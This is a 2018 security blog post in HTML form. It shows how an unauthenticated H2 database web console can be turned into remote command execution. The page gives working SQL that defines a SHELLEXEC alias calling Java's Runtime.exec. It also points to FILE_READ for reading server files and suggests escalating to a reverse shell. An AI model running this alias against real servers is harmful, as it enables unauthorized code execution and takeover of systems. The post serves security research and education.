<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>Gambler - Hacking and other stuffs</title>
    <meta name="description" content="Posts about hacking, coding and other stuffs" />

    <meta name="HandheldFriendly" content="True" />
    <meta name="MobileOptimized" content="320" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css" />
    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
    <!-- Customisation  -->
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css" />

</head>
<body class="home-template">

    <header class="main-header post-head no-cover">
    <nav class="main-nav  clearfix">
        <a class="back-button icon-arrow-left" href="/">Home</a>
        <a class="subscribe-button icon-feed" href="/feed.xml">Subscribe</a>
    </nav>
</header>

<main class="content" role="main">

    <article class="post">

        <header class="post-header">
            <h1 class="post-title">Abusing H2 Database ALIAS</h1>
            <section class="post-meta">
                <time class="post-date" datetime="2018-03-14">14 Mar 2018</time>
                
                    on RCE
                
            </section>
        </header>

<!--         <header class="post-header">
            <a id="blog-logo" href="https://mthbernardes.github.io">
                
                    <span class="blog-title">Gambler</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2018-03-14">14 Mar 2018</time>
            
                on RCE
            
        </span> -->

        <!-- <h1 class="post-title">Abusing H2 Database ALIAS</h1> -->

        <section class="post-content">
            <h4 id="how-to-get-a-shell-on-a-h2-database-using-alias-feature">How to get a shell on a H2 Database, using ALIAS feature.</h4>
<p>Today I was introduced to <a href="http://www.h2database.com">H2 Database</a>, a in-memory and pure Java Database, because it’s a in-memory database, the developers use it most to learning, unit tests and poc’s, but you can learn more about it on H2 <a href="2018-03-14-abusing-h2-database-alias.markdown">site</a>.</p>

<p>The H2 provides a web console, where you can manage your database, and here the things starts to be more interesting, by default it does not have an password set, so you can just log in, but what can we do inside it? The first thing I tried was the same trick that everyone knows on MySQL.</p>

<pre><code>SELECT 'SOME CONTENT' INTO OUTFILE '/tmp/saida.txt'
</code></pre>

<p>And of course it didn’t work, so I decided to be more smart and google it, trying to discover if anybody already find some RCE on it, and the maximum I found was a report made by the H2 Group on <a href="'https://www.securityfocus.com/bid/58536'">SecurityFocus</a>, but there wasn’t an available exploit or any technical detail.</p>

<p>So after it I did the most obvious thing, open the H2 site, go to the documentation, and tried to find any interesting function, the first thing I found was the <a href="http://www.h2database.com/html/functions.html?highlight=FILE_READ&amp;search=FILE_#file_read">FILE_READ</a> function, where I can read files from filesystem, Ok, cool, it’s a nice thing to do, but it’s not a shell, so digging on SQL commands section, I found the <a href="http://www.h2database.com/html/grammar.html#create_alias">CREATE ALIAS</a>, basically, you can create an function on H2 that calls a java code, as the example</p>

<pre><code>CREATE ALIAS GET_SYSTEM_PROPERTY FOR "java.lang.System.getProperty";
CALL GET_SYSTEM_PROPERTY('java.class.path');
</code></pre>
<p>or a more complex alias,</p>
<pre><code>CREATE ALIAS REVERSE AS $$ String reverse(String s) { return new StringBuilder(s).reverse().toString(); } $$;
CALL REVERSE('Test');
</code></pre>

<p>Now it’s game over, if I can execute Java code, I can get a shell, as I’m not a Java expert, I searchon Google a easy way to execute system commands with java, found a link on <a href="https://stackoverflow.com/a/20624914">stackoverflow</a>, I just adapted it inside the ALIAS, and now there’s a function that execute arbitrary code,</p>
<pre><code>CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('id')
</code></pre>

<p>After that just find if the server have any tool to do a <a href="https://github.com/mthbernardes/rsg">reverse shell</a>, and you’ll gain a interactive shell.</p>

<p><img src="/assets/images/h2-console-rce.gif" alt="h2-console-rce" /></p>

        </section>

        

        <footer class="post-footer">
            <!-- If we want to display author's name and bio -->
            
                <figure class="author-image">
                    <a class="img" href="/" style="background-image: url(/assets/images/profile.png)">
                    <span class="hidden">Matheus Bernardes's Picture</span></a>
                </figure>
                <section class="author">
                    <!-- Author Name -->
                    <h4> Matheus Bernardes </h4>
                    <!-- Author Bio -->
                    <p>
                        Security consultant, Python programmer, CTF <a href="https://rtfm-ctf.org" target="_blank">RTFM</a> team player and an enthusiast (noob) in reverse engineering.
                    </p>
                </section>
            

            <!-- Share links section -->
            <section class="share">
    <h4>Share this post</h4>
    <a class="icon-twitter" href="http://twitter.com/share?text=Abusing H2 Database ALIAS&amp;url=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html"
        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html"
        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

            <!-- Disqus comments -->
            
                <section class="disqus">
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'gambler-1';
        var disqus_developer = 1; // developer mode is on
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>

            

        </footer>

    </article>

</main>


    <footer class="site-footer clearfix">
      <section class="copyright">
        <a href="/">Gambler</a> &copy;
              2018 &bull; All rights reserved.
              <script src="https://www.hackthebox.eu/badge/7591"></script>
      </section>
      <section class="poweredby">Made with Jekyll using
        <a href="http://github.com/rosario/kasper">Kasper theme</a>
      </section>
    </footer>

    <script type="text/javascript" src="/assets/js/jquery-1.11.1.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="/assets/js/index.js"></script>

    <!-- Google Analytics Tracking code -->
    <script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-68962388-2']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();

    </script>
</body>
</html>
